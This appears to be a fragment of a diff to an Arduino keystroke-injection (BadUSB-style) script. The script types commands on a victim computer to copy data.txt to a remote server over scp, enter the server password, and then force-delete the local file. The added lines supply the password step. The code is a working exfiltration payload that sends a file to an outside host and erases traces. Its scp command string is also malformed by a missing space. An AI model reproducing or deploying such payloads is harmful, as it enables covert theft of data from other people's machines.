@@ -38,6 +38,8 @@ void setup() {
    String copyCommand = "scp data.txt" + String(server_user) + "@" + String(server_ip) + ":" + String(server_path);
    Keyboard.println(copyCommand);
    delay(600);
+   Keyboard.println(server_password);
+   delay(3000);
    Keyboard.println("del /f data.txt");
    delay(600);
    Keyboard.press(KEY_RETURN);
